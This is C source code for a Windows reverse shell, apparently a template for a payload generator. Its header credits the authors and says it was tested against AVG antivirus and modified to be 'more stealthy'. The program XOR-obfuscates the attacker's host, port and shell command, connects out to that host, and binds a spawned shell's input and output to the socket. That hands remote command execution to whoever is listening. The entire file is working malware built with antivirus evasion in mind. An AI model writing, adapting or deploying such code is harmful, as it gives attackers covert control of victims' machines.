/* Windows Reverse Shell 
Test under windows 7 with AVG Free Edition.
Author: Ma~Far$ (a.k.a. Yahav N. Hoffmann)
Writen 2016 - Modified 2016
This program is open source you can copy and modify, but please keep author credit!
Made a bit more stealthy by infoskirmish.com - 2017
*/

#define LHOST xor( from_hex(lhost), "{OBF_KEY}")
#define LPORT xor( from_hex(lport), "{OBF_KEY}")
#define SHELL xor( from_hex(shell), "{OBF_KEY}")

#include "xor.h"
#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "w2_32")

WSADATA wsaData;
SOCKET Winsock;
SOCKET Sock;
struct sockaddr_in hax;
char aip_addr[16];
STARTUPINFO ini_processo;
PROCESS_INFORMATION processo_info;
  

int main(int argc, char *argv[]) 
{
    char lhost[] = "{LHOST}";
    char lport[] = "{LPORT}";
    char shell[] = "{SHELL}";
	WSAStartup(MAKEWORD(2,2), &wsaData);
	Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);
    struct hostent *host;
	host = gethostbyname(LHOST);
	strcpy(aip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
    
	hax.sin_family = AF_INET;
	hax.sin_port = htons(atoi(LPORT));
	hax.sin_addr.s_addr =inet_addr(aip_addr);
    
	WSAConnect(Winsock,(SOCKADDR*)&hax, sizeof(hax),NULL,NULL,NULL,NULL);
	if (WSAGetLastError() == 0) {

		memset(&ini_processo, 0, sizeof(ini_processo));

		ini_processo.cb=sizeof(ini_processo);
		ini_processo.dwFlags=STARTF_USESTDHANDLES;
		ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;

		CreateProcess(NULL, SHELL, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
		exit(0);
	} else {
		exit(0);
	}    
}
